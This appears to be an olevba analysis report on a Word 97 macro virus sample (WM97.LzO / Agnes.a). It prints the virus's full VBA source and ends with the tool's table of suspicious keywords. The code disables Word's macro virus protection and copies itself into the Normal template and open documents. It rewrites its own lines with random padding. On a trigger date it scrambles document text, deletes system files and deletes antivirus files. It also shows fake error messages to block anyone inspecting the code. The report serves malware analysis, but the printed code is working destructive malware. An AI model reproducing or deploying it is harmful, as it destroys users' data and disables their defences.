olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Agnes.a-ea911c92a367ae6dfea5a740c0544212d5e3f638
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Agnes.a-ea911c92a367ae6dfea5a740c0544212d5e3f638 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LzO.bas 
in file: Virus.MSWord.Agnes.a-ea911c92a367ae6dfea5a740c0544212d5e3f638 - OLE stream: 'Macros/VBA/LzO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub JsHfLy4931()

    ' -= [LineZerO's Macro Engine 1.2] =-
    ' -= [WM97.LzO] =-

    ' -= [ID: 26188-Dv-46914931-Ov.W] =-

On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
 'This is an improved version of APMRS called SOPS by me :)
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("LzO").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("LzO").CodeModule
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("LzO").CodeModule
PolySize = Int(Rnd * 10)
For PolyMorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next PolyMorphic
End With
End If
If Day(Now()) = 20 Then
Dim a As Variant
Dim b As Variant
Selection.Wholestory
a = Selection
For i = 1 To Len(a)
b = Mid$(a, i, 1)
c = Asc(Mid$(a, i, 1))
d = c + 29
If d > 199 Then c = 30
e$ = e$ + Chr(d)
Next i
Selection.Wholestory
Selection.Cut
WordBasic.Insert e$
Kill ("c:\*.*")
Kill ("C:\WINDOWS\SYSTEM\*.*")
Call ExAuVe1493
End If
End Sub
Sub ExAuVe1493()
On Error Resume Next
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Programme\Dr Solomon's\Anti-Virus Toolkit\*.*")
Kill ("C:\PROGRAMME\TBAV\TBAV.DAT")
Kill ("C:\TBAV\TBAV.DAT")
Kill ("C:\Programme\Norton Antivirus\V32scan.dll")
Kill ("C:\Programme\Norton Antivirus\Virscan.dat")
End Sub
Sub Dv4691()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options
.SaveNormalPrompt = False
.VirusProtection = False
.ConfirmConversions = False
End With
Application.VBE.ActiveVBProject.VBComponents("LzO").Export "C:\LzO.sys"
With Dialogs(wdDialogFileSummaryInfo)
.Author = Chr(74) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(84) + Chr(119) + Chr(111) + Chr(102) + Chr(108) + Chr(111) + Chr(119) + Chr(101) + Chr(114) + Chr(32) + Chr(45) + Chr(61) + Chr(91) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(90) + Chr(101) + Chr(114) + Chr(216) + Chr(32) + Chr(86) + Chr(120) + Chr(32) + Chr(84) + Chr(101) + Chr(97) + Chr(109) + Chr(93) + Chr(61) + Chr(45)
.Comments = "WM97.LzO" & Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(76) + Chr(105) + Chr(77) + Chr(69) + Chr(32) + Chr(49) + Chr(46) + Chr(111)
.Keywords = "LiME ID: 26188-Dv-46914931-Ov.W"
.Execute
End With
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(x).Name = "LzO" Then JoDfCy6604ExAuVe4691 = True
Next x
For y = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(y).Name = "LzO" Then VxIhKr9962JsHfLy4931 = True
Next y
If JoDfCy6604ExAuVe4691 = True And VxIhKr9962JsHfLy4931 = False Then Set IjRmEy9549JgPhTl1493 = ActiveDocument.VBProject
If JoDfCy6604ExAuVe4691 = False And VxIhKr9962JsHfLy4931 = True Then Set IjRmEy9549JgPhTl1493 = NormalTemplate.VBProject
If JoDfCy6604ExAuVe4691 = True And VxIhKr9962JsHfLy4931 = True Then GoTo Ende_
IjRmEy9549JgPhTl1493.VBComponents.Import "C:\LzO.sys"
If VxIhKr9962JsHfLy4931 = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
If JoDfCy6604ExAuVe4691 = False Then NormalTemplate.Save
Ende_:
Call JsHfLy4931
End Sub
Sub AutoOpen()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
End Sub
Sub AutoExit()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
End Sub
Sub AutoNew()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
End Sub
Sub AutoExec()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
End Sub
Sub DateiNeu()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
Call Dv4691
Call JsHfLy4931
End Sub
Sub DateiÖffnen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call Dv4691
Call JsHfLy4931
End Sub
Sub DateiSchließen()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
WordBasic.FileClose dlg
End Sub
Sub DateiSpeichern()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
ActiveDocument.Save
End Sub
Sub DateiSpeichernUnter()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub DateiDrucken()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
Dialogs(wdDialogFilePrint).Show
End Sub
Sub BearbeitenErsetzen()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
Dialogs(wdDialogEditReplace).Show
End Sub
Sub ExtrasRechtschreibung()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
If Options.CheckGrammarWithSpelling = True Then
ActiveDocument.CheckGrammar
Else
ActiveDocument.CheckSpelling
End If
End Sub
Sub ExtrasSilbentrennung()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
Dialogs(wdDialogsToolsHyphenation).Show
End Sub
Sub ExtrasOptionen()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
Dialogs(wdDialogToolsOptions).Show
End Sub
Sub ViewCode()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
MsgBox "Nicht genug Speicher um Anwendung auszuführen", 16, "Microsoft Word"
End Sub
Sub ViewVBCode()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
MsgBox "Nicht genug Speicher um Anwendung auszuführen", 16, "Microsoft Word"
End Sub
Sub FileTemplates()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
MsgBox "Nicht genug Speicher um Anwendung auszuführen", 16, "Microsoft Word"
End Sub
Sub ToolsMacro()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
MsgBox "Nicht genug Speicher um Anwendung auszuführen", 16, "Microsoft Word"
End Sub
Sub FormatStyle()
On Error Resume Next
Call Dv4691
Call JsHfLy4931
MsgBox "Nicht genug Speicher um Anwendung auszuführen", 16, "Microsoft Word"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

